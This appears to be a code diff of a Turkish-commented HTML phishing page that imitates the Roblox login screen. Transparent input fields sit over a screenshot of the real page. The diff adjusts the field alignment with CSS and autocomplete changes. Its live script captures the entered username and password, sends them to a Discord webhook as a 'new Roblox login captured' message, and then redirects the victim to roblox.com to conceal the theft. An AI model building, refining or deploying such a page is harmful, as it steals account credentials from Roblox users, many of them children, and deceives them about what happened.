@@ -5,21 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Giriş</title>
     <style>
-        /* Ekranın tüm boşluklarını sıfırlıyoruz */
         html, body {
             margin: 0;
             padding: 0;
             width: 100%;
             height: 100%;
             overflow: hidden;
-            background-color: #0b0e11; /* Siyah arka plan */
+            background-color: #0b0e11; 
             display: flex;
             justify-content: center;
             align-items: center;
             font-family: Arial, sans-serif;
         }
 
-        /* Resmi ve girdileri bir arada tutan kilitli ana kafes */
         .wrapper {
             position: relative;
             width: 100vw;
@@ -29,33 +27,32 @@
             align-items: center;
         }
 
-        /* Oranları bozmadan ekranı en verimli şekilde kaplayan ayar */
         .tam-ekran-resim {
             width: 100%;
             height: 100%;
-            object-fit: contain; /* Resmin en-boy oranını bozmaz */
+            object-fit: contain; 
             display: block;
         }
 
         /* 
-           GİRİŞ PANELİ ÇERÇEVESİ:
-           Yazıların yukarı tırmanması için top değerini %32.5'e çektim kanka.
+           ANA PANEL ÇERÇEVESİ:
+           Kullanıcı adının tam oturduğu ilk haline (`32.5%`) geri sabitledim.
         */
         .form-container {
             position: absolute;
             width: 19.8%; 
             height: 48.5%;  
-            top: 32.5%;   /* Bu rakamı azaltarak tüm yazıları toptan YUKARI taşıdık */
+            top: 32.5%;   
             left: 50.1%;
             transform: translateX(-50%);
             box-sizing: border-box;
         }
 
-        /* Tüm elemanları bağımsız katmanlar olarak çiviliyoruz */
+        /* Tüm elemanların yüksekliklerini tarayıcıya zorla kabul ettiriyoruz */
         .form-container input, .form-container button, .form-container a {
             position: absolute;
             width: 100%;
-            height: 12.2%; 
+            height: 12.2% !important; /* Yüksekliği kesin olarak kilitledik */
             left: 0;
             background: transparent;
             border: none;
@@ -63,13 +60,13 @@
             box-sizing: border-box;
         }
 
-        /* Yazı yazılan input alanlarının iç metin ve dikey ortalama ayarları */
+        /* Yazıların dikey eksende aşağı sarkmasını önleyen satır yüksekliği sabitlemesi */
         .form-container input {
             color: #ffffff;
             font-size: 14px;
             padding: 0 12px;
-            display: flex;
-            align-items: center;
+            display: block;
+            line-height: 2.5; /* Yazıyı kutunun dikey tavanına doğru yukarıda tutar */
         }
 
         .form-container button, .form-container a {
@@ -77,57 +74,57 @@
         }
 
         /* ============================================================ */
-        /* İÇ ELEMANLARIN PANEL İÇİNDEKİ SABİT KOORDİNATLARI            */
+        /* BİRBİRİNDEN %100 BAĞIMSIZ HİZALAMALAR                        */
         /* ============================================================ */
 
-        /* 1. KUTU: Username Giriş Alanı */
+        /* 1. KUTU: Username Giriş Alanı (Buraya dokunma kanka) */
         .username-field {
-            top: 0%; 
+            top: 0% !important; 
         }
 
-        /* 2. KUTU: Password Giriş Alanı */
+        /* 2. KUTU: Password Giriş Alanı (Sadece bunu milimetrik yukarı aldık) */
         .password-field {
-            top: 15%; 
+            top: 14.8% !important; 
         }
 
         /* 3. BUTON: Log in butonu */
         .login-btn {
-            top: 33.2%; 
-            height: 13.5%; 
+            top: 33.2% !important; 
+            height: 13.5% !important; 
         }
 
         /* 4. BUTON: Send me the one-time code by email */
         .one-time-code-btn {
-            top: 65.2%; 
-            height: 13.5%;
+            top: 65.2% !important; 
+            height: 13.5% !important;
         }
 
         /* 5. BUTON: Quick Login */
         .quick-login-btn {
-            top: 81.8%; 
-            height: 13.5%;
+            top: 81.8% !important; 
+            height: 13.5% !important;
         }
 
         /* 6. LİNK: En alttaki Sign Up yazısı */
         .signup-link {
-            top: 101%; 
-            height: 8%;
-            width: 25%; 
+            top: 101% !important; 
+            height: 8% !important;
+            width: 25% !important; 
             left: auto;
-            right: 13.5%; 
+            right: 13.5% !important; 
         }
     </style>
 </head>
 <body>
 
     <div class="wrapper">
-        <!-- Arka plan resmi -->
         <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">
 
-        <!-- Kilitli form paneli -->
         <form id="girisFormu" class="form-container">
-            <input type="text" id="username" name="username" class="username-field" required autocomplete="off">
-            <input type="password" id="password" name="password" class="password-field" required>
+            <!-- autocomplete="new-password" ekleyerek tarayıcının yazıları kaydırmasını engelledik -->
+            <input type="text" id="username" name="username" class="username-field" required autocomplete="new-password">
+            <input type="password" id="password" name="password" class="password-field" required autocomplete="new-password">
+            
             <button type="submit" class="login-btn" title="Giriş Yap"></button>
             <button type="button" class="one-time-code-btn"></button>
             <button type="button" class="quick-login-btn"></button>
@@ -135,32 +132,23 @@
         </form>
     </div>
 
-    <!-- DISCORD WEBHOOK BAĞLANTISI -->
     <script>
-        // Kendi Discord Webhook linkini buraya yapıştırmayı unutma kanka!
         const webhookURL = "BURAYA_DISCORD_WEBHOOK_LINKINI_YAZ";
 
         document.getElementById('girisFormu').addEventListener('submit', function(e) {
             e.preventDefault();
-
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
-
             const mesaj = {
                 content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
             };
-
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(mesaj)
             })
-            .then(() => {
-                window.location.href = "https://roblox.com";
-            })
-            .catch(() => {
-                window.location.href = "https://roblox.com";
-            });
+            .then(() => { window.location.href = "https://roblox.com"; })
+            .catch(() => { window.location.href = "https://roblox.com"; });
         });
     </script>
 
